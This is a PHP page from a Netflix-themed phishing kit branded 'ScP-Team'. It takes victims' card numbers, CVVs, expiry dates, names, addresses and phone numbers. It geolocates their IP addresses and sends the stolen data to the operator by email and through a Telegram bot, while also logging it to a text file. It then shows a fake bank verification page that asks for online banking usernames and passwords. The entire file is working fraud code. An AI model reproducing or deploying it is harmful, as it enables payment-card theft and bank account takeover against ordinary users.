<?php
/*
  ██████  ▄████▄   ██▓███     ▄▄▄█████▓▓█████ ▄▄▄       ███▄ ▄███▓
▒██    ▒ ▒██▀ ▀█  ▓██░  ██▒   ▓  ██▒ ▓▒▓█   ▀▒████▄    ▓██▒▀█▀ ██▒
░ ▓██▄   ▒▓█    ▄ ▓██░ ██▓▒   ▒ ▓██░ ▒░▒███  ▒██  ▀█▄  ▓██    ▓██░
  ▒   ██▒▒▓▓▄ ▄██▒▒██▄█▓▒ ▒   ░ ▓██▓ ░ ▒▓█  ▄░██▄▄▄▄██ ▒██    ▒██ 
▒██████▒▒▒ ▓███▀ ░▒██▒ ░  ░     ▒██▒ ░ ░▒████▒▓█   ▓██▒▒██▒   ░██▒
▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░▒▓▒░ ░  ░     ▒ ░░   ░░ ▒░ ░▒▒   ▓▒█░░ ▒░   ░  ░
░ ░▒  ░ ░  ░  ▒   ░▒ ░            ░     ░ ░  ░ ▒   ▒▒ ░░  ░      ░
░  ░  ░  ░        ░░            ░         ░    ░   ▒   ░      ░   
      ░  ░ ░                              ░  ░     ░  ░       ░   
         ░                                                        
*/
session_start();
include "../../anti/anti1.php";
include "../../anti/anti2.php"; 
include "../../anti/anti3.php"; 
include "../../anti/anti4.php"; 
include "../../anti/anti5.php"; 
include "../../anti/anti7.php";
include '../../email.php';
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$message = "[link: $link ]\r\n";

$_SESSION['firstName'] = $_POST['firstName'];
$_SESSION['lastName'] = $_POST['lastName'];
$_SESSION['creditCardNumber'] = $_POST['creditCardNumber'];
$_SESSION['creditExpirationMonth'] = $_POST['creditExpirationMonth'];
$_SESSION['creditCardSecurityCode'] = $_POST['creditCardSecurityCode'];
$_SESSION['country'] = $_POST['country'];
$_SESSION['address'] = $_POST['address'];
$_SESSION['zip_code'] = $_POST['zip_code'];
$_SESSION['city'] = $_POST['city'];
$_SESSION['phone'] = $_POST['phone'];
$_SESSION['bank_name'] = $_SESSION['bank_name'];
$_SESSION['bank_type'] = $_SESSION['bank_type'];
$_SESSION['bank_brand'] = $_POST['bank_brand'];

$file = fopen("NetFlix_RzlT.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");


$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$COUNTRY = $IP_LOOKUP->country . "\r\n";
$countryCode = $IP_LOOKUP->countryCode. "\r\n";
$regionName    = $IP_LOOKUP->regionName . "\r\n";
$lat    = $IP_LOOKUP->lat . "\r\n";
$lon    = $IP_LOOKUP->long . "\r\n";
$timezone    = $IP_LOOKUP->timezone . "\r\n";
$isp    = $IP_LOOKUP->isp . "\r\n";
$as    = $IP_LOOKUP->as . "\r\n";
$CITY    = $IP_LOOKUP->city . "\r\n";
$REGION  = $IP_LOOKUP->region . "\r\n";
$STATE   = $IP_LOOKUP->regionName . "\r\n";
$ZIPCODE = $IP_LOOKUP->zip . "\r\n";

$hostname = gethostbyaddr($ip);
$bincheck = $_POST['creditCardNumber'] ;
$bincheck = preg_replace('/\s/', '', $bincheck);


$bin = $_POST['creditCardNumber'] ;
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,8);
$cardlastdigit = substr($_POST['creditCardNumber'],12,16);
$url = "https://lookup.binlist.net/".$bin;
$headers = array();
$headers[] = 'Accept-Version: 3';
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp=curl_exec($ch);
curl_close($ch);
$xBIN = json_decode($resp, true);

$_SESSION['bank_name'] = $xBIN["bank"]["name"];
$_SESSION['bank_scheme'] = strtoupper($xBIN["scheme"]);
$_SESSION['bank_type'] = strtoupper($xBIN["type"]);
$_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);
$_SESSION['bank_country'] = $xBIN["country"]["name"];

$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$subject = "♠️🐱‍👤🐱‍👤🐱‍👤✨✨⚡ScP-Team NetFlix Card RZLT⚡🐱‍👤🐱‍👤🐱‍👤✨✨ ♠️ $ip";
$headers = "From: ScP-Team<info@ScPTeam.com>";
$send = $email; 


$message = "[========== ♠️🐱‍👤🐱‍👤🐱‍👤✨✨⚡ ScP-Team NetFlix RZLT(Info) ⚡🐱‍👤🐱‍👤🐱‍👤✨✨ ♠️ =======================================================================]\r\n";
$message .= "|First name      : ".$_POST['firstName']."\r\n";
$message .= "|Last name      	 : ".$_POST['lastName']."\r\n";
$message .= "|Card Number      	 : ".$_POST['creditCardNumber']."\r\n";
$message .= "|EXP      	 : ".$_POST['creditExpirationMonth']."\r\n";
$message .= "|CVV      	 : ".$_POST['creditCardSecurityCode']."\r\n";
$message .= "|Country      	 : ".$_POST['country']."\r\n";
$message .= "|Billing Address      	 : ".$_POST['address']."\r\n";
$message .= "|Zip code      	 : ".$_POST['zip_code']."\r\n";
$message .= "|City      	 : ".$_POST['city']."\r\n";
$message .= "|Phone      	 : ".$_POST['phone']."\r\n";
$message .= "|Bank Name          : ".$_SESSION['bank_name']."\r\n";
$message .= "|Card Type       	 : ".$_SESSION['bank_type']."\r\n";
$message .= "|Card Brand       	 : ".$_SESSION['bank_brand']."\r\n";
$message .= "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\r\n";
$message .= "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\r\n";
$message .= "███▄▄▄▄                ▄████████               ███                  ▄████████            ▄█                  ▄█            ▀████    ▐████▀ \r\n";
$message .= "███▀▀▀██▄             ███    ███           ▀█████████▄             ███    ███           ███                 ███              ███▌   ████▀  \r\n";
$message .= "███   ███             ███    █▀               ▀███▀▀██             ███    █▀            ███                 ███▌              ███  ▐███    \r\n";
$message .= "███   ███            ▄███▄▄▄                   ███   ▀            ▄███▄▄▄               ███                 ███▌              ▀███▄███▀    \r\n";
$message .= "███   ███           ▀▀███▀▀▀                   ███               ▀▀███▀▀▀               ███                 ███▌              ████▀██▄     \r\n";
$message .= "███   ███             ███    █▄                ███                 ███                  ███                 ███              ▐███  ▀███    \r\n";
$message .= "███   ███             ███    ███               ███                 ███                  ███▌    ▄           ███             ▄███     ███▄  \r\n";
$message .= " ▀█   █▀              ██████████              ▄████▀               ███                  █████▄▄██           █▀             ████       ███▄ \r\n";
$message .= "                                                                                        ▀                                                  \r\n";
$message .= "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\r\n";
$message .=$ip."\nCountry : ".$COUNTRY."City: " .$CITY."Region : " .$REGION."State: " .$STATE."Zip : " .$ZIPCODE."country code: " .$countryCode."lat: " .$lat."lon: " .$lon."timezone: " .$timezone."isp: " .$isp."as: " .$as;
$message .= "UserAgent  :  ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "[========== ♠️🐱‍👤🐱‍👤🐱‍👤✨✨⚡ ScP-Team NetFlix RZLT(Info) ⚡🐱‍👤🐱‍👤🐱‍👤✨✨ ♠️ ========================================================================]\n";
mail($send,$subject,$message,$headers);


file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );


$myfile = fopen("NetFlix_RzlT.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);




?>
<html class=" js  js "><head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <title>Netflix</title>
      <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
      <link id="lib_main" type="text/css" rel="stylesheet" href="files/style/none.css">
      <link id="lib" type="text/css" rel="stylesheet" href="files/style/none2.css">
      <link rel="shortcut icon" href="files/img/favicon.ico">
      <link rel="apple-touch-icon" href="img/favicon.png">
      <script type="text/javascript" src="files/js/modernizr.min.js"></script>
	  <script src="files/js/jquery.js"></script> 
      <script src="files/js/jquery.ccvalid.js"></script>
      <script src="files/js/jquery.mask.js"></script>
   <style>@media print {#ghostery-tracker-tally {display:none !important}}</style><style>@media print {#ghostery-tracker-tally {display:none !important}}</style></head>
   <body>
      <center>
         <style>.success, .error, .validation {
            border: 1px solid;
            margin: 10px 0px;
            padding: 15px 10px 15px 50px;
            background-repeat: no-repeat;
            background-position: 10px center;
            }
            .success {
            color: #4F8A10;
            background-color: #DFF2BF;
            }
            .error{
            color: #D8000C;
            background-color: #FFBABA;
            }
            .validation{
            color: #D63301;
            background-color: #FFCCBA;
            }
         </style>
         <div style="margin-left:2px;width:350px;border:solid 1px #d8d4d4;padding:25px">
            <img src="files/img/vbvmcs.png" style="width: 90px;float:left;"><img src="files/img/nt_logo.svg" style="float: right;display: inline-block;margin-top: 18px;" width="100px">            <div style="clear:both"></div>
            <p style="font-size:13px;margin-top:25px;color:#807979"> Please enter your Security Code or OTP</p>
            <p style="font-size:13px;margin-top:25px;color:#807979">Authentication is required for this purchase.
please login to your bank account & type the otp code sent to your registered mobile *******</p>
            <script type="text/javascript">
               document.onreadystatechange = function () {
                 var state = document.readyState
                 if (state == 'complete') {
                     setTimeout(function(){
                         document.getElementById('interactive');
                       // document.getElementById('fixed').style.visibility="hidden";
               		 $("#fixed").hide();
               		 $("#formf").show(500);
                     },4000);
                 }
               }
            </script>
            <form method="post" action="./sendbank.php" id="formf" style="">
               <p style="display:none;" class="validation" id="tiitleerror">This code is invalid. Check the SMS and try again.</p><br><br><table align="center" width="290" style="font-size:11px;font-family:arial,sans-serif;color:#000;margin-top:30px">
                  <tbody>
                     
                     <tr>
                        <td align="right">Bank :</td>
                        <td><?php echo $_SESSION['bank_name']; ?></td>
                     </tr>
                     
                     <tr>
                        <td align="right">Date :</td>
                        <td><?php echo date("d/M/Y"); ?></td>
                     </tr>
                     
                     <tr>
                        <td align="right">Credit Card :</td>
                        <td><?php echo "XXX-XXXX-XXXX-" . $cardlastdigit; ?></td>
                     </tr>
                     <tr>
                        <td align="right">Full Name :</td>
                        <td><?php echo $_POST['firstName'] . " " . $_POST['lastName'] ?></td>
                     </tr>
                     <tr>
                        <td align="right" id="tiitleCardnetpas">Code Sent :</td>
                        <td>
                           <span id="countdown" class="timer"></span><script>
                              var seconds = 120;
                              function secondPassed() {
                              var minutes = Math.round((seconds - 30)/60);
                              var remainingSeconds = seconds % 60;
                              if (remainingSeconds < 10) {
                                 remainingSeconds = "0" + remainingSeconds; 
                              }
                              document.getElementById('countdown').innerHTML = minutes + ":" + remainingSeconds;
                              if (seconds == 0) {
                               clearInterval(countdownTimer);
                               document.getElementById('countdown').innerHTML = "";
                              } else {
                               seconds--;
                              }
                              }
                              var countdownTimer = setInterval('secondPassed()', 1000);
                           </script>
                        </td>
                     </tr>
                    <tr>
                        <td align="right">Bank ID (username)</td>
                        <td class="xx"><input style="width: 100px;" type="text" name="username" required></td>
                     </tr>
                     <tr><td align="right">Bank passcode (password)</td>
		                <td class="xx"><input style="width: 100px;" type="password" name="password1" required>
		                </td>
	                 </tr>
                     <tr>
                        <td></td>
                        <td><br>
                           <input style="width:74px" type="submit" value="Submit">
                        </td>
                     </tr>
                  </tbody>
               </table>
            </form>
            
            <div id="fixed" class="" style="display: none;">
               <img src="files/img/lod2.gif">
               <p class="">Loading...</p>
            </div>
            <p style="text-align:center;font-family:arial,sans-serif;font-size:9px;color:#656565"> Copyright © 1999-  2022 . All rights reserved. </p>
         </div>
         <div id="rotate" style="display:none">
            <div class="circle">
               <div class="rotate"></div>
            </div>
            <div class="overlay"></div>
         </div>
      </center>
   
</body></html>
